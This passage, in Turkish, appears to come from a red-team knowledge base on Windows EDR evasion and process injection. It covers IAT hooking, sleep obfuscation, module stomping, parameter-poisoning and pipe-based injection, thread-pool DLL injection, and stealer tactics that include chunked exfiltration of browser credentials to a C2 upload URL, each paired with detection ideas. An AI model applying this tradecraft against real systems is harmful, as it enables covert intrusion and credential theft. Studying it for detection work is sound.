- Beacon ve BOF'ların kod değişikliği olmadan aynı evasion yolundan şeffaf biçimde yararlanması için hedef API'leri kaydeden bir Aggressor script kullanın.

Tespit/DFIR değerlendirmeleri
- IAT bütünlüğü: image dışı (heap/anon) adreslere çözümlenen girdiler; import pointer'larının düzenli olarak doğrulanması.
- Stack anomalileri: yüklü image'lere ait olmayan return address'ler; image dışı PIC'e ani geçişler; tutarsız RtlUserThreadStart soy zinciri.
- Loader telemetrisi: süreç içinde IAT'ye yazma; import thunk'larını değiştiren erken DllMain etkinliği; yükleme sırasında oluşturulan beklenmedik RX bölgeleri.
- Image-load evasion: LoadLibrary* hook'lanmışsa, bellek maskeleme olaylarıyla ilişkili şüpheli automation/clr assembly yüklemelerini izleyin.

İlgili yapı taşları ve örnekler
- Yükleme sırasında IAT patching yapan reflective loader'lar (örn. TitanLdr, AceLdr)
- Memory masking hook'ları (örn. simplehook) ve stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stub'ları (örn. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Yerleşik PICO aracılığıyla import-time IAT hook'ları

Reflective loader'ı kontrol ediyorsanız, loader'ın `GetProcAddress` pointer'ını önce hook'ları kontrol eden özel bir resolver ile değiştirerek `ProcessImports()` **sırasında** import'ları hook'layabilirsiniz:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Geçici loader PIC'i kendini serbest bıraktıktan sonra da varlığını sürdüren **yerleşik bir PICO** (kalıcı PIC nesnesi) oluşturun.
- Loader'ın import resolver'ını üzerine yazan bir `setup_hooks()` işlevi dışa aktarın (örn. `funcs.GetProcAddress = _GetProcAddress`).
- `_GetProcAddress` içinde ordinal import'ları atlayın ve `__resolve_hook(ror13hash(name))` gibi hash tabanlı bir hook araması kullanın. Hook varsa onu döndürün; yoksa gerçek `GetProcAddress` işlevine devredin.
- Hook hedeflerini, Crystal Palace `addhook "MODULE$Func" "hook"` girdileriyle linkleme zamanında kaydedin. Hook, yerleşik PICO içinde bulunduğu için geçerliliğini korur.

Böylece, yüklenen DLL'in kod bölümüne yükleme sonrasında patch uygulamadan **import-time IAT yönlendirmesi** sağlanır.

### Hedef PEB-walking kullanıyorsa hook'lanabilir import'ları zorlama

Import-time hook'lar yalnızca işlev hedefin IAT'sinde gerçekten yer alıyorsa devreye girer. Bir modül API'leri PEB-walk + hash ile çözümlüyorsa (import girdisi yoksa), loader'ın `ProcessImports()` yolunun bunu görmesi için gerçek bir import oluşturun:

- Hash'lenmiş export çözümlemesini (örn. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) `&WaitForSingleObject` gibi doğrudan bir referansla değiştirin.
- Derleyici bir IAT girdisi üretir; böylece reflective loader import'ları çözümlerken araya girilebilir.

### `Sleep()` işlevine patch uygulamadan Ekko tarzı sleep/idle obfuscation

`Sleep` işlevine patch uygulamak yerine implantın kullandığı **gerçek wait/IPC primitive'lerini** (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`) hook'layın. Uzun beklemelerde, boşta kalınan süre boyunca bellekteki image'i şifreleyen Ekko tarzı bir obfuscation zinciriyle çağrıyı sarmalayın:<sup>[[31]](#references)[[27]](#references)</sup>

- `NtContinue` işlevini hazırlanmış `CONTEXT` frame'leriyle çağıran bir callback dizisi planlamak için `CreateTimerQueueTimer` kullanın.
- Tipik zincir (x64): image'i `PAGE_READWRITE` olarak ayarlayın → eşlenmiş image'in tamamını kapsayan alanda `advapi32!SystemFunction032` ile RC4 şifrelemesi yapın → bloklayan wait işlemini gerçekleştirin → RC4 ile şifreyi çözün → PE section'ları dolaşarak **section başına izinleri geri yükleyin** → tamamlanmayı bildirin.
- `RtlCaptureContext` bir `CONTEXT` şablonu sağlar; bunu birden çok frame'e kopyalayın ve her adımı çağırmak için register'ları (`Rip/Rcx/Rdx/R8/R9`) ayarlayın.

Operasyonel ayrıntı: uzun wait'ler için (örn. `WAIT_OBJECT_0`) “success” döndürün; böylece image maskelenmiş durumdayken çağıran devam eder. Bu yöntem modülü boşta kalınan aralıklarda tarayıcılardan gizler ve klasik “patched `Sleep()`” imzasından kaçınır.

Tespit fikirleri (telemetri tabanlı)
- `NtContinue` işaret eden `CreateTimerQueueTimer` callback'lerinin ani artışları.
- Büyük ve bitişik, image boyutundaki buffer'larda `advapi32!SystemFunction032` kullanımı.
- Büyük aralıklı `VirtualProtect` çağrısını takiben özel section başına izinlerin geri yüklenmesi.

### Sleep-obfuscation gadget'ları için runtime CFG kaydı

CFG etkin hedeflerde, `jmp [rbx]` veya `jmp rdi` gibi bir mid-function gadget'a yapılan ilk indirect jump, gadget modülün CFG metadata'sında bulunmadığından genellikle sürecin `STATUS_STACK_BUFFER_OVERRUN` hatasıyla çökmesine neden olur. Ekko/Kraken tarzı zincirleri güçlendirilmiş süreçlerde çalışır durumda tutmak için:<sup>[[30]](#references)</sup>

- Zincirin kullandığı her indirect destination'ı `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` ve `CFG_CALL_TARGET_VALID` girdileriyle kaydedin.
- Yüklü image'lerin (`ntdll`, `kernel32`, `advapi32`) içindeki adresler için `MEMORY_RANGE_ENTRY`, **image base** adresinden başlamalı ve **image boyutunun tamamını** kapsamalıdır.
- Manuel eşlenmiş/PIC/stomped bölgeler için bunun yerine **allocation base** adresini ve allocation boyutunu kullanın.
- Yalnızca dispatch gadget'ını değil, dolaylı yoldan ulaşılan export'ları da (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) ve indirect target hâline gelecek, saldırganın kontrolündeki çalıştırılabilir section'ları da işaretleyin.

Bu, ROP/JOP tarzı sleep zincirlerini “yalnızca CFG olmayan süreçlerde çalışır” durumundan `explorer.exe`, tarayıcılar, `svchost.exe` ve `/guard:cf` ile derlenmiş diğer endpoint'lerde kullanılabilen bir primitive'e dönüştürür.

### Uyuyan thread'ler için CET-safe stack spoofing

Tam `CONTEXT` değiştirme işlemi gürültülüdür ve CET Shadow Stack sistemlerinde sorun çıkarabilir; çünkü spoof edilmiş `Rip`, donanım shadow stack'iyle uyumlu olmalıdır. Sleep-masking için daha güvenli bir yöntem şöyledir:<sup>[[30]](#references)</sup>

- Aynı süreçteki başka bir thread'i seçin ve `NtQueryInformationThread` aracılığıyla onun `NT_TIB` / TEB stack sınırlarını (`StackBase`, `StackLimit`) okuyun.
- Mevcut thread'in gerçek TEB/TIB verisini yedekleyin.
- `GetThreadContext` ile gerçek uyku bağlamını yakalayın.
- Spoof bağlamına **yalnızca** gerçek `Rip` değerini kopyalayın; spoof edilmiş `Rsp`/stack durumunu olduğu gibi bırakın.
- Uyku aralığında, stack walker'ların geçerli bir stack aralığında unwind yapması için spoof thread'in `NT_TIB` değerini mevcut TEB'e kopyalayın.
- Wait tamamlandıktan sonra özgün TIB ve thread context'i geri yükleyin.

Bu yöntem, TEB stack metadata'sına güvenerek unwind'leri doğrulayan EDR stack walker'larını yanıltırken CET ile uyumlu bir instruction pointer'ı korur.

### Alternatif: APC tabanlı Kraken Mask

Timer-queue dispatch çok belirgin bir imzaya sahipse, aynı sleep-encrypt-spoof-restore dizisi kuyruğa alınmış APC'ler aracılığıyla askıya alınmış bir yardımcı thread'den yürütülebilir:<sup>[[27]](#references)</sup>

- Giriş noktası `NtTestAlert` olan bir yardımcı thread oluşturun.
- Hazırlanmış `CONTEXT` frame'lerini/APC'leri `NtQueueApcThread` ile kuyruğa alın ve `NtAlertResumeThread` ile çalıştırın.
- Varsayılan 64 KB thread stack'ini tüketmemek için zincir durumunu yardımcı thread'in stack'i yerine heap'te saklayın.
- Başlangıç event'ini atomik olarak bildirmek ve bloklamak için `NtSignalAndWaitForSingleObject` kullanın.
- TIB/context'i geri yüklemeden önce ana thread'i askıya alarak ( `NtSuspendThread` → restore → `NtResumeThread` ) bir tarayıcının yarım geri yüklenmiş bir stack'i yakalayabileceği yarış penceresini küçültün.

Bu yöntem, aynı RC4 masking ve stack-spoofing hedeflerini korurken `CreateTimerQueueTimer` + `NtContinue` imzasını yardımcı thread/APC imzasıyla değiştirir.

Ek tespit fikirleri
- Sleep, wait veya APC dispatch'ten kısa süre önce `VmCfgCallTargetInformation` ile `NtSetInformationVirtualMemory` kullanılması.
- `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` veya `ConnectNamedPipe` çevresinde `GetThreadContext`/`SetThreadContext` çağrıları.
- `NtQueryInformationThread` çağrısının ardından mevcut thread'in TEB/TIB stack sınırlarına doğrudan yazılması.
- Dolaylı yoldan `SystemFunction032`, `VirtualProtect` veya section-izinlerini geri yükleme yardımcılarına ulaşan `NtQueueApcThread`/`NtAlertResumeThread` zincirleri.
- İmzalı modüllerin içinde dispatch pivot'ları olarak `FF 23` (`jmp [rbx]`) veya `FF E7` (`jmp rdi`) gibi kısa gadget imzalarının tekrar tekrar kullanılması.


## Precision Module Stomping

Module stomping, belirgin private executable memory ayırmak veya yeni bir sacrificial DLL yüklemek yerine, payload'ları **hedef süreç içinde zaten eşlenmiş bir DLL'in `.text` section'ından** çalıştırır. Üzerine yazma hedefi, kod alanının sürecin hâlâ ihtiyaç duyduğu kod yollarını bozmadan payload'ı barındırabileceği, **yüklenmiş ve diskteki dosyaya dayalı bir image** olmalıdır.<sup>[[1]](#references)[[2]](#references)</sup>

### Güvenilir hedef seçimi

`uxtheme.dll` veya `comctl32.dll` gibi yaygın modüllere düşünmeden stomping uygulamak kırılgandır: DLL uzak süreçte yüklü olmayabilir ve çok küçük bir kod bölgesi sürecin çökmesine neden olabilir. Daha güvenilir bir iş akışı şöyledir:

1. Hedef süreç modüllerini sıralayın ve yalnızca önceden yüklenmiş DLL'lerin adlarını içeren bir include list tutun.
2. Önce payload'ı oluşturun ve **tam byte boyutunu** kaydedin.
3. Aday DLL'leri diskte tarayın ve PE section **`.text` `Misc_VirtualSize`** değerini payload boyutuyla karşılaştırın. Bu, dosya boyutundan daha önemlidir; çünkü **belleğe eşlendiğindeki** çalıştırılabilir section boyutunu yansıtır.
4. **Export Address Table (EAT)** tablosunu ayrıştırın ve stomp başlangıç offset'i olarak dışa aktarılan bir işlev RVA'sı seçin.
5. **Etki alanını** hesaplayın: payload seçilen işlev sınırını aşarsa, bellekte ondan sonra yer alan bitişik export'ların üzerine yazar.

Gerçek dünyada görülen yaygın recon/seçim yardımcıları:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operational notes
- `LoadLibrary` / beklenmedik image yüklemelerinin telemetry kayıtlarından kaçınmak için uzak process'te **zaten yüklü** olan DLL'leri tercih edin.
- Hedef uygulama tarafından nadiren çalıştırılan export'ları tercih edin; aksi takdirde normal code path'ler thread oluşturulmadan önce veya sonra stomp edilmiş byte'lara erişebilir.
- Büyük implantlar, buffer'ın tamamının injector source'unda doğru şekilde temsil edilmesi için shellcode embedding yönteminin string literal yerine **byte-array/braced initializer** kullanacak şekilde değiştirilmesini gerektirebilir.

Detection fikirleri
- Daha yaygın olan private RWX/RX allocation'lar yerine **image-backed executable page'lere** (`MEM_IMAGE`, `PAGE_EXECUTE*`) yapılan uzak yazmalar.
- Bellekteki byte'ları diskteki backing file ile artık eşleşmeyen export entry point'leri.
- Yakın zamanda ilk byte'ları değiştirilmiş meşru bir DLL export'unun içinde çalışmaya başlayan remote thread'ler veya context pivot'ları.
- DLL `.text` page'lerine yönelik, ardından thread oluşturulmasıyla sonuçlanan şüpheli `VirtualProtect(Ex)` / `WriteProcessMemory` dizileri.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3), klasik remote write yolunu (`VirtualAllocEx` + `WriteProcessMemory`) kullanmaktan kaçınan bir **process-injection / EDR-evasion** tekniğidir. Çalışan bir hedefe byte kopyalamak yerine, Windows'un seçili `CreateProcessW` başlangıç parametrelerini child process'e **kopyalayıp** bunları `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) içinde saklamasından yararlanır.<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW` tarafından kopyalanan poisonable carrier'lar

Kullanışlı carrier'lar şunlardır:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (`CREATE_UNICODE_ENVIRONMENT` ile) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Pratik carrier kısıtlamaları:

- `lpCommandLine`, `CreateProcessW` için **writable memory** göstermeli ve null terminator dahil en fazla **32,767 Unicode character** içerebilir.
- `lpEnvironment`, art arda gelen `NAME=VALUE\0` string'lerinden ve bunları sonlandıran ek bir `\0` karakterinden oluşan bir Unicode environment block olmalıdır.
- `lpReserved` resmî olarak ayrılmıştır; bu nedenle `ShellInfo` eşlemesi, belgelenmiş ve kararlı bir sözleşme yerine implementation detail olarak ele alınmalıdır.

Böylece normal process oluşturma işlemi **payload-transfer primitive** hâline gelir. Operator, attacker-controlled startup data ile child process'i oluşturur ve cross-process kopyalama işlemini Windows'un yapmasına izin verir.

### Remote write API'leri olmadan remote lookup akışı

Child oluşturulduktan sonra, kopyalanan buffer'ı **read-only** primitive'lerle bulun:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` değerini alın
2. Remote `PEB`'i okuyun
3. `PEB.ProcessParameters`'ı izleyin
4. `RTL_USER_PROCESS_PARAMETERS`'ı okuyun
5. Seçilen pointer'ı kullanın:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimal akış:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Kopyalanan parametre buffer'ını yürütme

Kopyalanan parametre bölgesi genellikle `RW` olur, yürütülebilir değildir. Yaygın bir P3 chain şöyledir:

1. Süreci normal şekilde oluşturun (askıya alınmış olarak değil)
2. `NtProtectVirtualMemory` / `VirtualProtectEx` ile seçilen parametre sayfasını yürütülebilir hâle getirin
3. `PROCESS_INFORMATION` tarafından zaten döndürülen ana thread handle'ını yeniden kullanın
4. `NtSetContextThread` (`CONTEXT_CONTROL`, `RIP` değerinin üzerine yazın) ile yürütmeyi yönlendirin

Klasik thread hijacking iş akışlarından farklı olarak bu yöntem **`SuspendThread` / `ResumeThread` gerektirmez**; bağlam, döndürülen ana thread handle'ı üzerinde doğrudan değiştirilebilir.

Bu, injection için yaygın olarak izlenen birkaç API'nin kullanılmasını önler:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- çoğu zaman `SuspendThread` / `ResumeThread` de

### Null byte sınırlaması ve aşamalı shellcode

Üç taşıyıcının tümü **string veya string benzeri veriler** olduğundan, `0x00` içeren ham bir payload aktarım sırasında kesilir. Pratik bir çözüm, çalışma zamanında sabit değerleri yeniden oluşturan ve ardından isteğe bağlı ikinci bir aşama yükleyen **null içermeyen birinci aşama** kullanmaktır.

Basit bir yöntem, XOR tabanlı sabit değer sentezidir:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

This, ilk aşamanın taşınan parametreye null byte eklemeden stack üzerinde string'ler, API argümanları, DLL yolları veya ikinci aşama shellcode loader oluşturmasını sağlar.

### İlk aşamadan stack tabanlı API çağrıları

İlk aşamanın `LoadLibraryA` gibi API'leri çağırması gerektiğinde şunları yapabilir:

- string/buffer'ı hedef stack'e push etmek
- **32-byte x64 shadow space** ayırmak
- `RCX`, `RDX`, `R8`, `R9` değerlerini sabitlere veya `RSP`'ye göreli pointer'lara ayarlamak
- çağrıdan önce `RSP`'yi **16-byte hizalı** tutmak

İkinci aşama daha sonra stack'ten `PAGE_READWRITE` izinli bir bellek alanına kopyalanabilir, `VirtualProtect` ile `PAGE_EXECUTE_READ` iznine geçirilebilir ve doğrudan RWX bellek ayırmadan bu alana atlanabilir.

### Tespit fikirleri

Yazarların belirttiği iyi avcılık fırsatları:

- **process-parameter sayfalarını executable** yapan `VirtualProtectEx` / `NtProtectVirtualMemory` çağrıları
- bu izin değişikliğini izleyen `SetThreadContext` / `NtSetContextThread` çağrıları
- `PEB` ve ardından `RTL_USER_PROCESS_PARAMETERS` için yapılan uzak okuma işlemleri
- process oluşturulurken olağan dışı uzun veya yüksek entropili `lpCommandLine`, `lpEnvironment` ya da `STARTUPINFO.lpReserved` değerleri

### Notlar

- P3, kendi başına tam bir execution primitive değil, **process'ler arası aktarım tekniğidir**: Kopyalanan parametrenin hâlâ execute iznine geçirilmesi ve bir execution redirection yöntemi gerekir.
- `RtlCreateProcessReflection` / Dirty Vanity, yazarlar tarafından değerlendirilmiş ancak dahili olarak `NtWriteVirtualMemory` ve `NtCreateThreadEx` gibi şüpheli primitive'lere başvurduğu için reddedilmiştir.

## Console STDIN pipe injection

Etkileşimli bir console child da **payload aktarım primitive'i** olarak kullanılabilir. Injector, child'ın standart girdisini bir pipe'a yönlendirir ve bir marker'ın ardından shellcode gönderir. Console programı veriyi kendi private belleğine okuduktan sonra injector bu buffer'ı bulur, executable yapar ve bir child thread'i bu adrese yönlendirir. Bu yöntem `VirtualAllocEx` ve `WriteProcessMemory` kullanımını önler, ancak genel bir EDR bypass değil, yine de process injection'dır.<sup>[[41]](#references)</sup>

"named-pipe" açıklamasına rağmen referans uygulama `CreatePipe` çağırır; bu, **anonymous pipe** oluşturur. Windows, anonymous pipe'ları dahili olarak benzersiz adlara sahip pipe nesneleriyle uygular; ancak PoC ne bir `\\.\pipe\<name>` yolu seçer ne de `CreateNamedPipe` çağırır. Varsayılan güvenlik tanımlayıcısıyla inherit edilebilir handle'lar oluşturur, read handle'ı `STARTUPINFO.hStdInput` içine yerleştirir, `STARTF_USESTDHANDLES` ayarını yapar ve handle inheritance etkinleştirilmiş şekilde yeni bir child başlatır. Bu nedenle PoC, sağlanan console executable'ını başlatır; pipe'ını mevcut bir process'e bağlamaz.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Referans iş akışı

Uygulama şu zinciri kullanır:<sup>[[41]](#references)</sup>

1. Child'ın `STDIN` ve `STDOUT`'u için anonymous pipe çiftleri oluşturun. Parent tarafındaki iki handle'da inheritance'ı devre dışı bırakın ve process oluşturulduktan sonra child tarafındaki kopyaları parent'ta kapatın.
2. `CREATE_NEW_CONSOLE` ile `netsh.exe` veya `nslookup.exe` gibi etkileşimli bir executable başlatın. Child, yönlendirilen standart handle'ları devralır.
3. `WriteFile` ile parent tarafındaki `STDIN` handle'ı üzerinden `rawData` binary array'inin tamamını gönderin. Console programı byte'ları tüketir ve bunların bir kopyasını kendi private committed bölgelerinden birinde bırakır.
4. `VirtualQueryEx` ile child'ın adres alanını tarayın, `ReadProcessMemory` ile aday `MEM_PRIVATE` bölgelerini okuyun ve `rawData`'nın başındaki marker'ı arayın.
5. Bulunan buffer'ın izinlerini `VirtualProtectEx` ile `PAGE_EXECUTE_READWRITE` olarak değiştirin.
6. Main thread'i belirleyin, suspend edin, `NtSetContextThread` ile `RIP` değerini `found_address + 0x19` olarak ayarlayın ve thread'i resume edin.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Sağlanan uygulama x64'e özgüdür: `CONTEXT.Rip` değerini değiştirir ve gömülü payload'u x64 shellcode'dur. `rawData`, 25 baytlık bir işaretleyiciyle başlar; bu nedenle çalıştırılabilir baytlar hexadecimal `0x19` offset'inde başlar. Payload'u değiştirirken bu düzeni koruyun veya işaretleyiciyi, arama vektörünü, dizi boyutunu ve çalıştırma offset'ini birlikte güncelleyin. Kaynak yorumlarında `0x0A`, `0x0D` ve `0x1A` da bad character olarak listelenmiştir. Bu iş akışı, alt sürecin token'ını veya ayrıcalıklarını değiştirmez.<sup>[[41]](#references)</sup>

Küçük yerel yardımcılar ve payload derleme kalıpları için bkz. [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Shellcode olmadan thread-pool callback DLL injection (DLLParty)

DLLParty, PoolParty tarzı thread-pool injection tekniğini uyarlayarak mevcut bir hedef worker'ın enjekte edilmiş bir callback stub'ı çalıştırmak yerine `LoadLibraryA` çağırmasını sağlar. Dispatch primitive'i, hedef pool'un I/O completion port'una kuyruğa alınan bir `TP_DIRECT` completion'dır. Bu, süreç izinlerini aşmaz: PoC, `OpenProcess(PROCESS_ALL_ACCESS)` çağırır ve hedef belleğin okunabilir/yazılabilir olmasını, ayrıca worker-factory ve completion-port handle'larının kopyalanabilir olmasını gerektirir.<sup>[[46]](#references)[[47]](#references)</sup>

Windows x64'te worker, stack üzerinde bulunan `TP_CALLBACK_INSTANCE` işaretçisini ilk callback argümanı olan `RCX` üzerinden iletir. `LoadLibraryA` aynı işaretçiyi `LPCSTR` olarak yorumlar. Test edilen yolda `TppWorkerThread`, işaretçiyi `RSP+0x178` konumunda oluştururken bu nesneye yaptığı ilk olağan yazma `RSP+0x1d0` konumundadır. Bu nedenle, 0x58 baytlık bu öneke sığan null ile sonlandırılmış bir DLL yolu, dispatch öncesinde üzerine yazılmadan instance'ın başlangıcında yer alabilir. Bu, belirli bir build üzerinde gözlemlenmiştir; belgelenmiş bir Windows ABI garantisi değildir.<sup>[[46]](#references)[[47]](#references)</sup>

Referans iş akışı şöyledir:<sup>[[46]](#references)[[47]](#references)</sup>

1. `NtQuerySystemInformation(SystemHandleInformation)` ile hedefin handle'larını sıralayın ve nesne türlerini sorgulayarak `TpWorkerFactory`'yi belirleyin. Bir worker-factory handle'ını kopyalayın ve `WorkerFactoryBasicInformation` sorgulayın; `StartParameter`, uzak `TP_POOL` değerini verir. `TotalWorkerCount == 0` olan factory'leri atlayın.
2. `TP_POOL.CompletionPort` değerini okuyun ve pool'un özel worker listesini dolaşın. Test edilen Windows 10 19045 x64 build'inde (`ntdll.dll 10.0.19041.4842`), listenin başı `pool+0x60` konumundadır; her bağlantı `worker+0x10` konumundadır, dolayısıyla `worker+0x38` konumundaki callback-instance slot'u `link+0x28` değerine eşittir. PoC; işaretçi hizalamasını, bağlantı karşılıklılığını, pool sahipliğini, sıfır olmayan thread ID'lerini, yinelenen düğümleri ve kararlı bir liste başını denetler.
3. Kuyruğa alınan completion herhangi bir worker tarafından tüketilebileceğinden DLL yolunu **bulunan her** worker slot'una yazın. `Callback = LoadLibraryA` içeren bir `TP_DIRECT`'i hedefin yazılabilir belleğine yerleştirin. PoC, `VirtualAllocEx` yerine bir worker stack'inde `last_slot-0x500` konumunu kullanır; bu offset deneyseldir ve etkin stack verileriyle çakışmamalıdır.
4. Hedef completion-port handle'ını kopyalayın ve `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)` çağrısını yapın. Uzak `TP_DIRECT` adresi completion key'dir. Mevcut bir worker, üzerine yazılmış callback-instance işaretçisiyle `LoadLibraryA` çağırır ve hedefin zaten erişebildiği bir DLL'i yükler.

PoC, hedef PID'sini (`DLLParty.exe <target_pid>`) alır ve `DLLParty.cpp` dosyasında hard-coded bir DLL yolu kullanır; x64 executable oluşturmadan önce hedefin erişebileceği bir yol belirleyin. Ayrıca kendi sürecindeki `LoadLibraryA` adresini uzak callback olarak kullanır; bu nedenle adresin hedefte geçerli olduğunu varsayar. Kod, yol uzunluğunu 0x58 baytlık önekle karşılaştırmaz ve son elemanı indekslemeden önce worker dolaşımının bir slot bulup bulmadığını denetlemez. Hedef build için özel offset'leri, stack düzenini ve yazılabilir alanı yeniden doğrulayın. `CreateRemoteThreadEx`, shellcode ve `VirtualAllocEx` kullanmamak, süreçler arası yazma işlemlerini veya DLL yükleme telemetrisini ortadan kaldırmaz.<sup>[[46]](#references)[[47]](#references)</sup>

## Dosyasız kaçınma ve kimlik bilgisi hırsızlığı için SantaStealer taktikleri

SantaStealer (diğer adıyla BluelineStealer), modern info-stealer'ların AV bypass, anti-analysis ve kimlik bilgilerine erişimi tek bir iş akışında nasıl birleştirdiğini gösterir.<sup>[[24]](#references)</sup>

### Klavye düzeni kontrolü ve sandbox gecikmesi

- Bir yapılandırma bayrağı (`anti_cis`), `GetKeyboardLayoutList` üzerinden yüklü klavye düzenlerini listeler. Kiril alfabesi kullanan bir düzen bulunursa örnek, boş bir `CIS` işaretleyicisi bırakır ve stealer'ları çalıştırmadan sonlanır; böylece hariç tutulan bölgelerde asla çalışmazken bir avcılık artefaktı bırakır.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Katmanlı `check_antivm` mantığı

- Variant A, süreç listesini tarar, her adı özel bir rolling checksum ile hash'ler ve sonucu debugger/sandbox'lar için gömülü blocklist'lerle karşılaştırır; checksum işlemini bilgisayar adı üzerinde de tekrarlar ve `C:\analysis` gibi çalışma dizinlerini kontrol eder.
- Variant B, sistem özelliklerini inceler (minimum süreç sayısı, yakın zamandaki çalışma süresi), VirtualBox additions'ı tespit etmek için `OpenServiceA("VBoxGuest")` çağrısı yapar ve single-stepping'i saptamak için sleep işlemlerinin süresini kontrol eder. Herhangi bir eşleşme, modüller başlatılmadan önce işlemi durdurur.

### Fileless helper + çift ChaCha20 reflective loading

- Ana DLL/EXE, diske bırakılan veya belleğe manuel olarak map edilen bir Chromium credential helper gömer; fileless mode, hiçbir helper artifaktı yazılmaması için import ve relocation işlemlerini kendisi çözümler.
- Bu helper, ikinci aşama bir DLL'i ChaCha20 ile iki kez şifrelenmiş olarak saklar (iki adet 32 baytlık key + 12 baytlık nonce). Her iki şifre çözme işleminden sonra blob'u reflective olarak yükler (`LoadLibrary` kullanmadan) ve [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) üzerinden alınan `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` export'larını çağırır.<sup>[[25]](#references)</sup>
- ChromElevator rutinleri, canlı bir Chromium browser'a inject etmek, AppBound Encryption key'lerini devralmak ve ABE hardening'e rağmen SQLite database'lerinden password, cookie ve credit card verilerini doğrudan decrypt etmek için direct-syscall reflective process hollowing kullanır.

### Modüler bellek içi toplama ve parçalara bölünmüş HTTP exfil

- `create_memory_based_log`, global `memory_generators` function-pointer tablosunu dolaşır ve etkin her modül için (Telegram, Discord, Steam, screenshot'lar, belgeler, browser extension'ları vb.) bir thread başlatır. Her thread sonuçları paylaşılan buffer'lara yazar ve yaklaşık 45 saniyelik join süresinin ardından dosya sayısını bildirir.
- İşlem tamamlandığında her şey, statically linked `miniz` library'si kullanılarak `%TEMP%\\Log.zip` olarak zip'lenir. Ardından `ThreadPayload1` 15 saniye bekler ve arşivi HTTP POST ile `http://<C2>:6767/upload` adresine 10 MB'lık parçalar hâlinde gönderirken browser `multipart/form-data` boundary'sini (`----WebKitFormBoundary***`) taklit eder. Her parçaya `User-Agent: upload`, `auth: <build_id>` ve isteğe bağlı olarak `w: <campaign_tag>` eklenir; son parçaya ise C2'nin yeniden birleştirme işleminin tamamlandığını anlaması için `complete: true` eklenir.

## References

- [1] [Gelişmiş Evasion Tradecraft: Hassas Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog yazısı](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stack'ler: malware için artık bedava geçiş yok](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – örnek](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – örnek](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – DarkCloud Stealer için yeni infection chain ve ConfuserEx tabanlı obfuscation](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Zero trust'ınıza güvenmeli misiniz? Zscaler posture check'lerini aşmak](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – ToolShell'den önce: Storm-2603'ün önceki ransomware operasyonlarını incelemek](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Forwarded export'ları kötüye kullanmak](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Export envanteri (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library arama sırası](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
